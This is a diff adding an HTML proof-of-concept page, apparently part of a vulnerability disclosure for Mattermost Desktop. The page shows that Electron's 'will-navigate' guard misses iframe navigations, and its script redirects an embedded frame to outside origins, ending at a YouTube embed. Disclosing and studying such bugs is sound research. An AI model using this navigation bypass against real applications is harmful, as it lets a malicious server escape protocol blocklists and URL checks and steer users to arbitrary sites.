@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PoC Nav - game0v3r.in</title></head>
+<body>
+<script>
+// Stage 2: iframe has now navigated from localhost:7331 → game0v3r.in
+// document.write stamps domain + deeper explanation + second countdown
+
+document.open();
+document.write('<!DOCTYPE html><html><head><meta charset="utf-8">');
+document.write('<style>');
+document.write('*{margin:0;padding:0;box-sizing:border-box}');
+document.write('body{background:#0a0a0a;color:#fff;font-family:monospace;');
+document.write('display:flex;flex-direction:column;align-items:center;');
+document.write('justify-content:center;height:100vh;gap:0}');
+document.write('#stage{color:#0ff;font-size:0.9em;letter-spacing:2px;margin-bottom:10px}');
+document.write('#domain{color:#0f0;font-size:1.3em;margin-bottom:20px}');
+document.write('#bug{color:#fc0;font-size:0.82em;max-width:740px;text-align:center;');
+document.write('line-height:1.7;margin-bottom:30px;border:1px solid #fc0;');
+document.write('padding:14px 20px;border-radius:6px;background:#1a1400}');
+document.write('#count{font-size:7em;font-weight:bold;color:#f33;letter-spacing:6px;line-height:1}');
+document.write('#label{font-size:1em;color:#888;margin-top:10px;letter-spacing:3px}');
+document.write('#dest{font-size:0.75em;color:#555;margin-top:16px}');
+document.write('code{background:#222;padding:1px 5px;border-radius:3px;color:#0cf}');
+document.write('</style></head><body>');
+
+document.write('<div id="stage">&#x25BA; STAGE 2 — IFRAME CROSS-ORIGIN ESCAPE CONFIRMED</div>');
+document.write('<div id="domain">&#x1f310; Now at: <strong>' + location.hostname + '</strong></div>');
+
+document.write('<div id="bug">');
+document.write('<strong>&#x26A0; Root Cause: <code>will-navigate</code> is mainframe-only in Electron</strong><br><br>');
+document.write('Electron\'s <code>webContents.on("will-navigate", handler)</code> fires <em>only</em> when the ');
+document.write('<strong>top-level frame</strong> (the WebContents itself) initiates a navigation — e.g. ');
+document.write('<code>window.location = X</code> at the page root, an anchor click, or a form submission in the main frame.<br><br>');
+
+document.write('When an <code>&lt;iframe&gt;</code> navigates — via <code>iframe.contentWindow.location.href = X</code>, ');
+document.write('a link inside it, or <code>window.location</code> from within iframe JS — ');
+document.write('Electron routes this through the <em>subframe</em> (<code>FrameTreeNode</code>) of the same WebContents. ');
+document.write('<code>will-navigate</code> is <strong>not emitted</strong> for subframe navigations. Period.<br><br>');
+
+document.write('The correct Electron event for catching iframe navigations is <code>will-frame-navigate</code> ');
+document.write('(introduced in Electron 30). Mattermost Desktop\'s <code>webContentsManager.ts</code> only listens to ');
+document.write('<code>will-navigate</code>, leaving every iframe on every registered server completely unrestricted. ');
+document.write('Any registered evil server can embed an iframe that escapes to arbitrary origins, ');
+document.write('bypassing protocol blocklists, allowedURL checks, and all navigation guards.');
+document.write('</div>');
+
+document.write('<div id="count">3</div>');
+document.write('<div id="label">ESCAPING TO FINAL DESTINATION</div>');
+document.write('<div id="dest">https://www.youtube.com/embed/M8MM38Xlbb8</div>');
+document.write('</body></html>');
+document.close();
+
+var n = 3;
+var tick = setInterval(function() {
+  n--;
+  var el = document.getElementById('count');
+  if (!el) { clearInterval(tick); return; }
+  if (n > 0) {
+    el.textContent = n;
+  } else {
+    clearInterval(tick);
+    el.textContent = '&#x1F3AC;';
+    // Second escape — iframe goes from game0v3r.in → YouTube embed.
+    // Still zero intervention from Electron's will-navigate.
+    window.location.href = 'https://www.youtube.com/embed/M8MM38Xlbb8?si=AMRynsvU9m0Ie4ox';
+  }
+}, 1000);
+</script>
+</body>
+</html>
